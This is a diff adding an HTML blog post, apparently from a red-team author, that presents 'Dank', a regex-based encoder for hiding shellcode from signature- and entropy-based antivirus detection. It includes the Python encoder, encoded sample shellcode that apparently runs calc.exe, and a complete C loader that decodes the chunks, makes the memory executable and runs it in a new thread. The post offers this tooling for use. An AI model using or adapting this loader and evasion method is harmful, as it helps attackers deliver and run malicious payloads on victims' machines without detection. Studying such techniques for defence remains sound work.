@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Dank: The greatest encoder you've never heard of</title>
+<link rel="icon" type="image/png" href="../favicon-16x16.png" sizes="16x16" />
+<meta charset="utf-8">
+<style>
+	img {
+		display: block;
+		margin-left: auto;
+		margin-right: auto;
+		width: 75%;
+	}
+</style>
+</head>
+<body>
+<textarea theme="united" toc="true" style="display:none;">
+# Introduction
+
+Data encoding is used in Red Teaming for a variety of reasons. Encoding schemes
+like Base64 and XOR masks are used to hide data from simple signature-based
+detections. While anything can be encoded, encoding is most often relegated to
+shellcode or network traffic because these are the two things most often
+signatured by defensive toolsets.
+
+Many Red Teamers rely on existing encoding schemes like those mentioned above or
+use **encryption** algorithms like AES which in this context are simply
+providing more robust forms of data obfuscation for the same purpose of evading
+signature-based detections.
+
+These days, when you encrypt data (ex. shellcode) and package it into a binary
+file, the **entropy** of the resulting data as it exists in that file is a
+concern. That is, defensive products analyzing a binary might use the presence
+of high-entropy data in the `.rdata` and `.data` sections as part of their
+"maliciousness scoring".
+
+In this blog post, I will humbly present my solution to the encoding problem:
+**Dank**, the deterministic finite automata ranker. Dank provides a powerful
+programmatic encoding interface that can transform artbitrary data (ie. raw or
+encrypted) and change it's format into anything describeable as a regular
+expression. Dank relies on an algorithm from compression theory called the
+Goldberg-Sipser ranking of regular languages.
+
+I have assembled the pieces needed to use this algorithm into [a 600-line,
+standalone, single C++ header file that can be used
+today](https://github.com/cramppet/libdank). Enjoy :)
+
+# TL;DR
+
+You start by invoking the encoding Python script:
+
+```bash
+python3 shellcode_encoder.py msgbox.bin
+```
+
+This will produce output like the following:
+
+```
+#define SHELLCODE_SIZE 276
+#define CAPACITY_SIZE 16
+#define NUM_CHUNKS 18
+#define FIXED_SLICE 36
+
+const char* regex = "((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))-(((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))-)(((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))-)(((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))-)((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))((a|b|c|d|e|f)|(0|1|2|3|4|5|6|7|8|9))";
+
+char* mydata[] = {
+    "51525041-5141-0000-00c0-e8f0e48348fc",
+    "528b4818-528b-4860-528b-4865d2314856",
+    "c03148c9-314d-4a4a-b70f-4850728b4820",
+    "ede2c101-410d-c9c1-4120-2c027c613cac",
+    "88808bd0-0148-3c42-8b20-528b48514152",
+    "4418488b-50d0-0148-6774-c08548000000",
+    "4888348b-41c9-ff48-56e3-d0014920408b",
+    "c101410d-c9c1-41ac-c031-48c9314dd601",
+    "4458d875-d139-4508-244c-034cf175e038",
+    "491c408b-4448-0c8b-4166-d0014924408b",
+    "5a595e58-4158-41d0-0148-88048b41d001",
+    "4158e0ff-5241-20ec-8348-5a4159415841",
+    "000001ba-485d-ffff-ff57-e9128b485a59",
+    "8b31ba41-0000-0101-8d8d-480000000000",
+    "ff9dbd95-a6ba-410a-2a1d-e0bbd5ff876f",
+    "47bb0575-e0fb-800a-7c06-3c28c48348d5",
+    "2e636c61-63d5-ffda-8941-59006a6f7213",
+    "00000000-0000-0000-0000-000000657865",
+};
+```
+
+You would take the output from the above script and insert it into the template
+below:
+
+```c
+#include <cstdio>
+#include <windows.h>
+
+#include "libdank.h"
+
+
+<INSERT OUTPUT FROM ABOVE HERE>
+
+
+int main(void) {
+  DFA myDfa = DFA::from_regex(regex);
+  myDfa.buildTable(FIXED_SLICE);
+
+  PBYTE buf = (PBYTE)VirtualAlloc(NULL, SHELLCODE_SIZE, MEM_COMMIT, PAGE_READWRITE);
+  PBYTE p = NULL;
+  DWORD tmp = SHELLCODE_SIZE;
+  DWORD count = 0;
+  HANDLE hThread = INVALID_HANDLE_VALUE;
+  BigInteger bi = 0;
+
+  for (int i = 0; i < NUM_CHUNKS; i++) {
+    bi = myDfa.rank(mydata[i]);
+    count = min(CAPACITY_SIZE, tmp);
+    p = bi.to_bytes(count).data();
+    memcpy(buf + (i * CAPACITY_SIZE), p, count);
+    tmp -= CAPACITY_SIZE;
+  }
+
+  VirtualProtect(buf, SHELLCODE_SIZE, PAGE_EXECUTE_READ, &tmp);
+  hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
+
+  WaitForSingleObject(hThread, INFINITE);
+  VirtualFree(buf, 0, MEM_DECOMMIT | MEM_RELEASE);
+
+  return 0;
+}
+```
+
+
+# Dank Explained
+
+Dank uses an algorithm called **ranking**. Ranking is a process whereby we
+associate an ordinal value (based on a lexicographical ordering) with the
+elements of some finite regular language. In other words, this algorithm forms a
+bijection between the integers and elements of a regular language.
+
+The effect of this algorithm is that we can use compact descriptions of regular
+languages called regular expressions (regexes) to create programmatic encoders.
+That is, encoders whose operation is changeable in real-time and which can
+generate output describable by any regex.
+
+If you want more background on the theory of automata-based regex engines and
+want to know how to write one from scratch check out Russ Cox's work here:
+
+- https://swtch.com/~rsc/regexp/regexp1.html
+
+
+# Using Dank
+
+Digging into the `shellcode_encoder.py` script, we see the following:
+
+```python
+#!/usr/bin/env python3
+
+import math
+import argparse
+
+from dank.DankEncoder import DankEncoder
+
+
+def main():
+  parser = argparse.ArgumentParser(description='encode shellcode into custom formats')
+  parser.add_argument('shellcode')
+  parser.add_argument('-r', '--regex', required=False, default='([a-f]|[0-9]){8}-(([a-f]|[0-9]){4}-){3}([a-f]|[0-9]){12}')
+  parser.add_argument('-l', '--length', required=False, type=int, default=36)
+  args = vars(parser.parse_args())
+
+  with open(args['shellcode'], 'rb') as handle:
+    shellcode = handle.read()
+
+  enc = DankEncoder(args['regex'], args['length'])
+  capacity = math.floor(math.log2(enc.num_words(args['length'], args['length'])) / 8)
+  num_chunks = math.ceil(len(shellcode) / capacity)
+
+  print()
+  print('#define SHELLCODE_SIZE %d' % len(shellcode))
+  print('#define CAPACITY_SIZE %d' % capacity)
+  print('#define NUM_CHUNKS %d' % num_chunks)
+  print('#define FIXED_SLICE %d' % args['length'])
+  print()
+  print('const char* regex = "%s";' % DankEncoder.preprocess(args['regex']))
+  print()
+  print('char* mydata[] = {')
+  for i in range(0, len(shellcode), capacity):
+    chunk = shellcode[i:i+capacity]
+    instance = enc.unrank(int.from_bytes(chunk, byteorder='little')).decode('utf-8')
+    print('\t"%s",' % instance)
+  print('};')
+
+
+if __name__ == '__main__':
+  main()
+```
+
+In particular, we can see these two arguments:
+
+```python
+parser.add_argument('-r', '--regex', required=False, default='([a-f]|[0-9]){8}-(([a-f]|[0-9]){4}-){3}([a-f]|[0-9]){12}')
+parser.add_argument('-l', '--length', required=False, type=int, default=36)
+```
+
+These allow us to control the format that is used for encoding the shellcode.
+Note that the decoder logic is invariant -- it does not change regardless of the
+format selected, this is one of the major virtues of this method.
+
+So, we can supply these argument and change our encoding format without having
+to do anything:
+
+```bash
+python3 shellcode_encoder.py msgbox.bin --regex '(a|b)+' --length 100
+```
+
+This results in:
+
+```
+#define SHELLCODE_SIZE 276
+#define CAPACITY_SIZE 12
+#define NUM_CHUNKS 23
+#define FIXED_SLICE 100
+
+const char* regex = "(a|b)+";
+
+char* mydata[] = {
+  "aaaaababaaababaaaaabaaaaaaaaaaaaaaaaaaaaaaaabbaaaaaabbbabaaabbbbaaaabbbaabaabaaaaabbabaabaaabbbbbbaa",
+  "aaaaababaababaaababbabaabaaaabbaababbbabaabaaabbaaababaabaaaabababbaababaaabababaabaababaaaaabaaaaab",
+  "aaaaabbbaababaaababbabaabaaaaabaaaaaababaababaaababbabaabaaaaaabbaaaababaababaaababbabaabaaaabbaaaaa",
+  "aaaabbaaaaaaaabbaaababaabaaabbaabaabaabbaaababaabbababaababaabaababababbabbbaaaabbbbabaabaaaababaaaa",
+  "aaaaabaaaaabaaaabbabbbaabaabbbaaaaababaaaaabaabaaaaaaababbaaaaaaaabaabbbbbaaabbaaaabaabbbbaabababbaa",
+  "aaaabaaababbaabaaaaaababaababaaababbabaabaaaababaaababaaaaabababaababbbabbabbbbaaababbaaaaabaaaaaaab",
+  "aaaaabaabaaaaaaaaaaaaaaaaaaaaaaaaaaabaaabaaabaaaaaaabaaababbbbabaaaaaaaaaaababaabaaaaabbbbaaabaaaaba",
+  "aaaaabaaabaaaaabbaaaabaabaaabaaababbababaaaabbabaaaaaaaaaaababaabaaaabbaabbbabbbabaabbaaaaaabaaaabab",
+  "aaaaabaaaaabbbaabaabbbbbbbbbabaabaaaabababbabbbaaabbbbabaaaaaaaaaaababaabaabaabaaaaaabaaaaaabaaababb",
+  "aaaabbaaaaaaaabbaaababaabaaabbaabaabaabbaaababaabbabbbababbaaaaaaaababaabaaabaaabaaaaabbabaabaaababb",
+  "aaaabbbbaaababbbababbbbaaaaaaabbbaaabbaaaaabaaaaaaababaaaaabaaaabbabbbaabaabbbaaaaababaaaaabbababbaa",
+  "aaaaabaaabaaababbaaabbabbaaaabbbababbbabaaabaabbbaababaaababaaaabaaaaabaabaaabaabbaaaaaaaabbabaabbaa",
+  "aaaaabaaabaaabaabaaaaaaabbaabaaababbabaaaaababbaabbabbabaaaaaaaaaaababaabaabaabaabaaabaaaaaabaaababb",
+  "aaaaaaaaaaababaabaaabaaabaaaaaaaabaabaaababbabaaaaabbbabaaaaaaaaaaababaabaabaaabbbaaabaaaaaabaaababb",
+  "aaaaababbaababaaaaabababbaaaabaaaaabababbabaababbaabababbbbaababbaaaabaaaaabababbaaaabaaaaabbbabaaaa",
+  "aaaaabaaaaabababbaaabbbaaaaabbbbbbbbababaabaabaaaaabaabaaaaabbbabbaabaaaaabbabaabaaaababbabaabaaaaab",
+  "aaaaabaabaaaababbbabbbbbbbbbbbbbbbbbbbbbbbbbabababbbbbbabaabaaabaababaaababbabaabaaaababbabaababbaab",
+  "aaaabaaabbabbaaabbababaabaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbabbbaba",
+  "aaaabbabababbbbbbbbbbaaaabbbabbabbbbbaaababbaabbaaabbabbbabaabaaaaabaaaaaaaaaaaaaaaaaaaaaaabaaaaaaab",
+  "aaaabbbbbbbbbaabbbabbabbbbabbaabababbabaabbababbbabaabaaaaabaaaababaaabababaaaabbbabbbbaaaaababbbabb",
+  "aaaabbbaaaaabbbbbabbbaaaaaaaaaaababaabbbbbaaaaaaabbaaabbbbaaaababaaabbaaabaabaaaaabbabaabaaabbababab",
+  "aaaabaaabaababaaaaabababbaabaaaaaaaaabbababaabbabbbbabbbaabaaaabaabbabaaabbbbabbbabbaaaaabababbbabab",
+  "aaaaaaaaaaaaabbaabababbbbaaaabbaababaababbbaabbaaabbabbabbaaabbaaaababbaaabbbbabababbbbbbbbbbbabbaba",
+};
+```
+
+
+## Dank's Regex Syntax
+
+Dank's regex engine implements a simple subset of regular expression syntax
+which is widely used.
+
+The syntax **DOES** support the following subset of features:
+
+- Simple grouping using `()` syntax
+- Greedy matching operators: `+`, `?`, `*`, `{n}`, `{n,}`, `{n,m}`
+- Simple character classes: `[a-z]`
+  - We do not support syntax like `[a-zA-Z0-9]` instead you must use `([a-z]|[A-Z]|[0-9])`
+
+The syntax does **DOES NOT** support any other common operations such as:
+
+- Wildcard character `.`
+- Backreferences `\1`, ...
+- Escape sequences such as `\s`, `\w`, `\d`, ...
+- Capture groups
+- Anchors such as start-of-line `^` and end-of-line `$`
+- Non-greedy matching `??`, `*?`, `+?`, ...
+- Lookahead/lookbehind
+- Trailing/inline operations
+- ... (pretty much every other PCRE feature)
+
+## Calculating Lengths
+
+Dank encodes data into fixed-length chunks. You need to determine the length of
+chunks you will create and pass it via the `--length` argument.
+
+This can be subtle sometimes. For example, given something like a UUID regex,
+the length is fixed at 36 bytes exactly. However, given something like `(a|b)+`
+there is no fixed length that **must** be used, you control it explicitly.
+
+You can use the `DankEncoder` class from the `dank` Python package to help
+calculate the lengths if you don't want to think about it:
+
+```python
+def infer_size_bounds(regex: str) -> Tuple[int, int]:
+  i, low, high = 1, 0, 0
+  t = DankEncoder(regex, MAX_INFER_LENGTH)
+  while i < MAX_INFER_LENGTH:
+    words = t.num_words(i, i)
+    if words != 0:
+      low = i
+      break
+    i += 1
+  i = MAX_INFER_LENGTH
+  while i >= low:
+    words = t.num_words(i, i)
+    if words != 0:
+      high = i
+      break
+    i -= 1
+  return (low, high)
+```
+
+Provided with some regex and suitable value for `MAX_INFER_LENGTH` (maximum
+possible length you would expect), this function will return the upper and lower
+bounds on the language. That is, the range of lengths where language members
+reside.
+
+```python
+>>> MAX_INFER_LENGTH = 100
+>>> infer_size_bounds('(a|b)+')
+(1, 100)
+>>> infer_size_bounds('([a-f]|[0-9]){8}-(([a-f]|[0-9]){4}-){3}([a-f]|[0-9]){12}')
+(36, 36)
+>>> infer_size_bounds('((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9]).){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])')
+(7, 15)
+>>>
+```
+
+# Conclusion
+
+I hope that you found this helpful and that it inspries you take an interest in
+this project. While shellcode encoding was the subject of interest here, the
+algorithm and code shown can be applied to anything. Moreover, they can be used
+for use cases entirely disconnected from encoding, see the `dank` Python package
+README for more ideas:
+
+- https://github.com/cramppet/dank
+
+</textarea>
+</body>
+<script src="../vendor/strapdown.min.js"></script>
+</html>
